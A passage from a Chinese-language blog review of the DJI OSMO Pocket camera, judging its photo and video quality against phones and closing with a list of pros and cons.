https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]